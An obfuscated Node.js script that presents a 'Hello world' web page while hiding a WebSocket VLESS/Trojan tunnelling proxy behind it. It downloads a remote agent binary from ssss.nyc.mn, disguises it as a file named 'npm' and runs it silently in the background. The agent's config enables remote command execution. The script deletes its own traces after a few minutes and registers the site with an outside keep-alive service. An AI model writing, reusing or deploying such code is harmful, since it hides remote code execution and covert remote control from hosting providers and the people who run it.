const _0x2eef83=_0x22d8;(function(_0x534a12,_0x5dde03){const _0x1e80e3=_0x22d8,_0x40d1e9=_0x534a12();while(!![]){try{const _0x378f12=parseInt(_0x1e80e3(0x198))/0x1*(parseInt(_0x1e80e3(0x18f))/0x2)+-parseInt(_0x1e80e3(0x19c))/0x3*(parseInt(_0x1e80e3(0x1c6))/0x4)+parseInt(_0x1e80e3(0x17f))/0x5+-parseInt(_0x1e80e3(0x160))/0x6*(-parseInt(_0x1e80e3(0x181))/0x7)+-parseInt(_0x1e80e3(0x1a5))/0x8+parseInt(_0x1e80e3(0x174))/0x9+-parseInt(_0x1e80e3(0x19f))/0xa*(-parseInt(_0x1e80e3(0x19a))/0xb);if(_0x378f12===_0x5dde03)break;else _0x40d1e9['push'](_0x40d1e9['shift']());}catch(_0x5dcd25){_0x40d1e9['push'](_0x40d1e9['shift']());}}}(_0x5724,0x2dbce));const os=require('os'),http=require(_0x2eef83(0x1cc)),fs=require('fs'),axios=require(_0x2eef83(0x1ad)),net=require(_0x2eef83(0x1bb)),path=require(_0x2eef83(0x18a)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x2eef83(0x1d6)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x2eef83(0x194)]||'6e7dd00e-a498-4f27-8dde-6da96267cb7c',NEZHA_SERVER=process[_0x2eef83(0x167)][_0x2eef83(0x176)]||'',NEZHA_PORT=process[_0x2eef83(0x167)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x2eef83(0x167)][_0x2eef83(0x1c9)]||'',DOMAIN=process[_0x2eef83(0x167)]['DOMAIN']||_0x2eef83(0x184),AUTO_ACCESS=process[_0x2eef83(0x167)][_0x2eef83(0x197)]||!![],WSPATH=process[_0x2eef83(0x167)]['WSPATH']||UUID[_0x2eef83(0x1b9)](0x0,0x8),SUB_PATH=process[_0x2eef83(0x167)]['SUB_PATH']||_0x2eef83(0x16c),NAME=process[_0x2eef83(0x167)][_0x2eef83(0x1a7)]||'Hug',PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2b37b3=_0x2eef83;try{const _0x178394=await axios[_0x2b37b3(0x193)](_0x2b37b3(0x1b7)),_0x59528e=_0x178394['data'];ISP=(_0x59528e[_0x2b37b3(0x1d4)]+'-'+_0x59528e[_0x2b37b3(0x1b1)])['replace'](/ /g,'_');}catch(_0x3006ff){ISP=_0x2b37b3(0x1a6);}};GetISP();function _0x22d8(_0xc680de,_0x2f4bfc){_0xc680de=_0xc680de-0x15d;const _0x572404=_0x5724();let _0x22d882=_0x572404[_0xc680de];return _0x22d882;}const httpServer=http[_0x2eef83(0x18c)]((_0x53d6ca,_0x492ded)=>{const _0x338cdf=_0x2eef83;if(_0x53d6ca[_0x338cdf(0x17c)]==='/'){const _0x2e89d0=path['join'](__dirname,_0x338cdf(0x1ab));fs[_0x338cdf(0x1a3)](_0x2e89d0,'utf8',(_0x5b5294,_0x56e0f3)=>{const _0x2e6218=_0x338cdf;if(_0x5b5294){_0x492ded['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x492ded[_0x2e6218(0x1c1)](_0x2e6218(0x15f));return;}_0x492ded[_0x2e6218(0x1c2)](0xc8,{'Content-Type':_0x2e6218(0x1cf)}),_0x492ded[_0x2e6218(0x1c1)](_0x56e0f3);});return;}else{if(_0x53d6ca[_0x338cdf(0x17c)]==='/'+SUB_PATH){const _0x414d34=_0x338cdf(0x190)+UUID+'@'+DOMAIN+_0x338cdf(0x1c3)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x338cdf(0x16f)+WSPATH+'#'+NAME+'-'+ISP,_0x154842=_0x338cdf(0x16d)+UUID+'@'+DOMAIN+_0x338cdf(0x188)+DOMAIN+_0x338cdf(0x1ce)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x3284d1=_0x414d34+'\x0a'+_0x154842,_0x106835=Buffer[_0x338cdf(0x15d)](_0x3284d1)[_0x338cdf(0x15e)](_0x338cdf(0x164));_0x492ded[_0x338cdf(0x1c2)](0xc8,{'Content-Type':_0x338cdf(0x17b)}),_0x492ded[_0x338cdf(0x1c1)](_0x106835+'\x0a');}else _0x492ded['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x492ded['end'](_0x338cdf(0x172));}}),wss=new WebSocket[(_0x2eef83(0x1bd))]({'server':httpServer}),uuid=UUID[_0x2eef83(0x1c8)](/-/g,''),DNS_SERVERS=[_0x2eef83(0x169),_0x2eef83(0x183)];function resolveHost(_0x3d922e){return new Promise((_0x427646,_0xc68667)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x3d922e)){_0x427646(_0x3d922e);return;}let _0x260206=0x0;function _0x26b3bd(){const _0x22b483=_0x22d8;if(_0x260206>=DNS_SERVERS[_0x22b483(0x163)]){_0xc68667(new Error(_0x22b483(0x192)+_0x3d922e+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x232b5e=DNS_SERVERS[_0x260206];_0x260206++;const _0x1dd2f1='https://dns.google/resolve?name='+encodeURIComponent(_0x3d922e)+_0x22b483(0x1b3);axios[_0x22b483(0x193)](_0x1dd2f1,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x22b483(0x1b0)](_0xf04e8e=>{const _0x1ff8e2=_0x22b483,_0x595998=_0xf04e8e[_0x1ff8e2(0x18b)];if(_0x595998[_0x1ff8e2(0x189)]===0x0&&_0x595998[_0x1ff8e2(0x16e)]&&_0x595998['Answer'][_0x1ff8e2(0x163)]>0x0){const _0x4a429f=_0x595998[_0x1ff8e2(0x16e)][_0x1ff8e2(0x1ca)](_0x5a413b=>_0x5a413b[_0x1ff8e2(0x1c4)]===0x1);if(_0x4a429f){_0x427646(_0x4a429f[_0x1ff8e2(0x18b)]);return;}}_0x26b3bd();})[_0x22b483(0x171)](_0x164ffa=>{_0x26b3bd();});}_0x26b3bd();});}function handleVlessConnection(_0xcf19ae,_0x4e3177){const _0x456ab0=_0x2eef83,[_0x9a2f90]=_0x4e3177,_0x35b895=_0x4e3177[_0x456ab0(0x1b9)](0x1,0x11);if(!_0x35b895[_0x456ab0(0x1d7)]((_0x1720dc,_0x37b055)=>_0x1720dc==parseInt(uuid[_0x456ab0(0x1a9)](_0x37b055*0x2,0x2),0x10)))return![];let _0x547aba=_0x4e3177[_0x456ab0(0x1b9)](0x11,0x12)[_0x456ab0(0x1a4)]()+0x13;const _0x5d7a8d=_0x4e3177[_0x456ab0(0x1b9)](_0x547aba,_0x547aba+=0x2)['readUInt16BE'](0x0),_0x361350=_0x4e3177[_0x456ab0(0x1b9)](_0x547aba,_0x547aba+=0x1)['readUInt8'](),_0x313c08=_0x361350==0x1?_0x4e3177[_0x456ab0(0x1b9)](_0x547aba,_0x547aba+=0x4)[_0x456ab0(0x16b)]('.'):_0x361350==0x2?new TextDecoder()['decode'](_0x4e3177[_0x456ab0(0x1b9)](_0x547aba+0x1,_0x547aba+=0x1+_0x4e3177[_0x456ab0(0x1b9)](_0x547aba,_0x547aba+0x1)[_0x456ab0(0x1a4)]())):_0x361350==0x3?_0x4e3177[_0x456ab0(0x1b9)](_0x547aba,_0x547aba+=0x10)[_0x456ab0(0x1c0)]((_0x104251,_0x419d30,_0x54d8f3,_0x4ac04b)=>_0x54d8f3%0x2?_0x104251[_0x456ab0(0x1c5)](_0x4ac04b[_0x456ab0(0x1b9)](_0x54d8f3-0x1,_0x54d8f3+0x1)):_0x104251,[])['map'](_0x113110=>_0x113110[_0x456ab0(0x1bc)](0x0)[_0x456ab0(0x15e)](0x10))['join'](':'):'';_0xcf19ae[_0x456ab0(0x1ba)](new Uint8Array([_0x9a2f90,0x0]));const _0x202008=createWebSocketStream(_0xcf19ae);return resolveHost(_0x313c08)[_0x456ab0(0x1b0)](_0x1f8eb0=>{const _0x26e910=_0x456ab0;net['connect']({'host':_0x1f8eb0,'port':_0x5d7a8d},function(){const _0x89162=_0x22d8;this['write'](_0x4e3177[_0x89162(0x1b9)](_0x547aba)),_0x202008['on'](_0x89162(0x180),()=>{})[_0x89162(0x1a8)](this)['on'](_0x89162(0x180),()=>{})[_0x89162(0x1a8)](_0x202008);})['on'](_0x26e910(0x180),()=>{});})[_0x456ab0(0x171)](_0xe940f1=>{const _0x40a808=_0x456ab0;net[_0x40a808(0x182)]({'host':_0x313c08,'port':_0x5d7a8d},function(){const _0x7cdb98=_0x40a808;this[_0x7cdb98(0x170)](_0x4e3177[_0x7cdb98(0x1b9)](_0x547aba)),_0x202008['on']('error',()=>{})[_0x7cdb98(0x1a8)](this)['on'](_0x7cdb98(0x180),()=>{})[_0x7cdb98(0x1a8)](_0x202008);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x233f0d,_0x372ac9){const _0x5a834a=_0x2eef83;try{if(_0x372ac9['length']<0x3a)return![];const _0x43327d=_0x372ac9[_0x5a834a(0x1b9)](0x0,0x38)[_0x5a834a(0x15e)](),_0x3aa9a4=[UUID];let _0x3f81fe=null;for(const _0x4186c7 of _0x3aa9a4){const _0x376039=crypto['createHash'](_0x5a834a(0x18e))['update'](_0x4186c7)[_0x5a834a(0x1d3)](_0x5a834a(0x1b2));if(_0x376039===_0x43327d){_0x3f81fe=_0x4186c7;break;}}if(!_0x3f81fe)return![];let _0xa507be=0x38;_0x372ac9[_0xa507be]===0xd&&_0x372ac9[_0xa507be+0x1]===0xa&&(_0xa507be+=0x2);const _0x40feba=_0x372ac9[_0xa507be];if(_0x40feba!==0x1)return![];_0xa507be+=0x1;const _0x2ca4a1=_0x372ac9[_0xa507be];_0xa507be+=0x1;let _0x2675c8,_0xf960cd;if(_0x2ca4a1===0x1)_0x2675c8=_0x372ac9[_0x5a834a(0x1b9)](_0xa507be,_0xa507be+0x4)['join']('.'),_0xa507be+=0x4;else{if(_0x2ca4a1===0x3){const _0x56ff85=_0x372ac9[_0xa507be];_0xa507be+=0x1,_0x2675c8=_0x372ac9[_0x5a834a(0x1b9)](_0xa507be,_0xa507be+_0x56ff85)[_0x5a834a(0x15e)](),_0xa507be+=_0x56ff85;}else{if(_0x2ca4a1===0x4)_0x2675c8=_0x372ac9[_0x5a834a(0x1b9)](_0xa507be,_0xa507be+0x10)[_0x5a834a(0x1c0)]((_0x14e605,_0x505960,_0x654783,_0x209214)=>_0x654783%0x2?_0x14e605[_0x5a834a(0x1c5)](_0x209214[_0x5a834a(0x1b9)](_0x654783-0x1,_0x654783+0x1)):_0x14e605,[])[_0x5a834a(0x1aa)](_0x3d9fea=>_0x3d9fea[_0x5a834a(0x1bc)](0x0)['toString'](0x10))[_0x5a834a(0x16b)](':'),_0xa507be+=0x10;else return![];}}_0xf960cd=_0x372ac9[_0x5a834a(0x1bc)](_0xa507be),_0xa507be+=0x2;_0xa507be<_0x372ac9[_0x5a834a(0x163)]&&_0x372ac9[_0xa507be]===0xd&&_0x372ac9[_0xa507be+0x1]===0xa&&(_0xa507be+=0x2);const _0x45fb03=createWebSocketStream(_0x233f0d);return resolveHost(_0x2675c8)[_0x5a834a(0x1b0)](_0x40f7f5=>{const _0x30338c=_0x5a834a;net[_0x30338c(0x182)]({'host':_0x40f7f5,'port':_0xf960cd},function(){const _0x40113d=_0x30338c;_0xa507be<_0x372ac9['length']&&this[_0x40113d(0x170)](_0x372ac9[_0x40113d(0x1b9)](_0xa507be)),_0x45fb03['on']('error',()=>{})[_0x40113d(0x1a8)](this)['on'](_0x40113d(0x180),()=>{})[_0x40113d(0x1a8)](_0x45fb03);})['on'](_0x30338c(0x180),()=>{});})['catch'](_0x425768=>{const _0x1f920d=_0x5a834a;net[_0x1f920d(0x182)]({'host':_0x2675c8,'port':_0xf960cd},function(){const _0x15288c=_0x1f920d;_0xa507be<_0x372ac9[_0x15288c(0x163)]&&this['write'](_0x372ac9['slice'](_0xa507be)),_0x45fb03['on']('error',()=>{})[_0x15288c(0x1a8)](this)['on'](_0x15288c(0x180),()=>{})['pipe'](_0x45fb03);})['on'](_0x1f920d(0x180),()=>{});}),!![];}catch(_0x1666bd){return![];}}wss['on'](_0x2eef83(0x175),(_0x1f6510,_0x495c0b)=>{const _0x5d8e28=_0x2eef83,_0x2c5d14=_0x495c0b[_0x5d8e28(0x17c)]||'';_0x1f6510[_0x5d8e28(0x18d)](_0x5d8e28(0x17d),_0x16e8ef=>{const _0x373005=_0x5d8e28;if(_0x16e8ef['length']>0x11&&_0x16e8ef[0x0]===0x0){const _0x51e759=_0x16e8ef[_0x373005(0x1b9)](0x1,0x11),_0x37426f=_0x51e759[_0x373005(0x1d7)]((_0x1f7660,_0x18cf43)=>_0x1f7660==parseInt(uuid['substr'](_0x18cf43*0x2,0x2),0x10));if(_0x37426f){!handleVlessConnection(_0x1f6510,_0x16e8ef)&&_0x1f6510[_0x373005(0x1b4)]();return;}}!handleTrojanConnection(_0x1f6510,_0x16e8ef)&&_0x1f6510[_0x373005(0x1b4)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x5d1ed7=_0x2eef83,_0x5f005d=os[_0x5d1ed7(0x1d0)]();return _0x5f005d===_0x5d1ed7(0x191)||_0x5f005d===_0x5d1ed7(0x1d2)||_0x5f005d===_0x5d1ed7(0x1ac)?!NEZHA_PORT?_0x5d1ed7(0x1bf):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x5d1ed7(0x185):_0x5d1ed7(0x1b8);},downloadFile=async()=>{const _0x21e30a=_0x2eef83;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3b2015=getDownloadUrl(),_0x4f7252=await axios({'method':_0x21e30a(0x193),'url':_0x3b2015,'responseType':'stream'}),_0x59009c=fs[_0x21e30a(0x1be)](_0x21e30a(0x187));return _0x4f7252[_0x21e30a(0x18b)][_0x21e30a(0x1a8)](_0x59009c),new Promise((_0x58135c,_0x1eb214)=>{const _0x3725ba=_0x21e30a;_0x59009c['on']('finish',()=>{const _0x1db46d=_0x22d8;console[_0x1db46d(0x165)]('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',_0x3aa3c4=>{if(_0x3aa3c4)_0x1eb214(_0x3aa3c4);_0x58135c();});}),_0x59009c['on'](_0x3725ba(0x180),_0x1eb214);});}catch(_0x446648){throw _0x446648;}},runnz=async()=>{const _0x5694ca=_0x2eef83;try{const _0x4e8dcb=execSync(_0x5694ca(0x168),{'encoding':_0x5694ca(0x196)});if(_0x4e8dcb[_0x5694ca(0x179)]()!==''){console[_0x5694ca(0x165)](_0x5694ca(0x162));return;}}catch(_0x538fdc){}await downloadFile();let _0xe02fa3='',_0x597300=[_0x5694ca(0x186),_0x5694ca(0x1cb),_0x5694ca(0x177),'2087',_0x5694ca(0x1a1),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x25218a=_0x597300[_0x5694ca(0x19e)](NEZHA_PORT)?_0x5694ca(0x1b6):'';_0xe02fa3=_0x5694ca(0x1b5)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5694ca(0x1d8)+NEZHA_KEY+'\x20'+_0x25218a+_0x5694ca(0x1a2);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x144c09=NEZHA_SERVER[_0x5694ca(0x19e)](':')?NEZHA_SERVER['split'](':')[_0x5694ca(0x161)]():'',_0x2d6f86=_0x597300['includes'](_0x144c09)?_0x5694ca(0x1a0):_0x5694ca(0x16a),_0x579ff6=_0x5694ca(0x17a)+NEZHA_KEY+_0x5694ca(0x195)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x2d6f86+_0x5694ca(0x178)+UUID;fs['writeFileSync'](_0x5694ca(0x199),_0x579ff6);}_0xe02fa3=_0x5694ca(0x166);}else{console['log'](_0x5694ca(0x1d5));return;}}try{exec(_0xe02fa3,{'shell':_0x5694ca(0x19d)},_0x3c9576=>{const _0x1d989a=_0x5694ca;if(_0x3c9576)console[_0x1d989a(0x180)]('npm\x20running\x20error:',_0x3c9576);else console[_0x1d989a(0x165)](_0x1d989a(0x17e));});}catch(_0xd1f6bc){console[_0x5694ca(0x180)](_0x5694ca(0x173)+_0xd1f6bc);}};function _0x5724(){const _0x147c96=['620216zVAMMU','application/json','replace','NEZHA_KEY','find','8443','http','https://oooo.serv00.net/add-url','&fp=chrome&type=ws&host=','text/html','arch','Server\x20is\x20running\x20on\x20port\x20','arm64','digest','country','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','child_process','every','\x20-p\x20','from','toString','Hello\x20world!','17562fKIHGY','pop','npm\x20is\x20already\x20running,\x20skip\x20running...','length','base64','log','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','env','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','8.8.4.4','false','join','sub','trojan://','Answer','&path=%2F','write','catch','Not\x20Found\x0a','error:\x20','740565eXQOek','connection','NEZHA_SERVER','2096','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','trim','client_secret:\x20','text/plain','url','message','npm\x20is\x20running','1406780kvNkqs','error','252rolwCV','connect','1.1.1.1','1234.abc.com','https://amd64.ssss.nyc.mn/v1','443','npm',':443?security=tls&sni=','Status','path','data','createServer','once','sha224','10526zqhTQX','vless://','arm','Failed\x20to\x20resolve\x20','get','UUID','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','utf-8','AUTO_ACCESS','5oHaDPP','config.yaml','1826jOcKaD','unlink','3FlHIhW','/bin/bash','includes','10540hjkPPU','true','2083','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','readFile','readUInt8','2623168kwzYJW','Unknown','NAME','pipe','substr','map','index.html','aarch64','axios','listen','Automatic\x20Access\x20Task\x20added\x20successfully','then','asOrganization','hex','&type=A','close','setsid\x20nohup\x20./npm\x20-s\x20','--tls','https://speed.cloudflare.com/meta','https://amd64.ssss.nyc.mn/agent','slice','send','net','readUInt16BE','Server','createWriteStream','https://arm64.ssss.nyc.mn/v1','reduce','end','writeHead',':443?encryption=none&security=tls&sni=','type','concat'];_0x5724=function(){return _0x147c96;};return _0x5724();}async function addAccessTask(){const _0xfc2351=_0x2eef83;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xb40203='https://'+DOMAIN;try{const _0x4f0131=await axios['post'](_0xfc2351(0x1cd),{'url':_0xb40203},{'headers':{'Content-Type':_0xfc2351(0x1c7)}});console['log'](_0xfc2351(0x1af));}catch(_0x33463e){}}const delFiles=()=>{const _0x253ad0=_0x2eef83;fs['unlink'](_0x253ad0(0x187),()=>{}),fs[_0x253ad0(0x19b)](_0x253ad0(0x199),()=>{});};httpServer[_0x2eef83(0x1ae)](PORT,()=>{const _0x23796a=_0x2eef83;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x23796a(0x1d1)+PORT);});
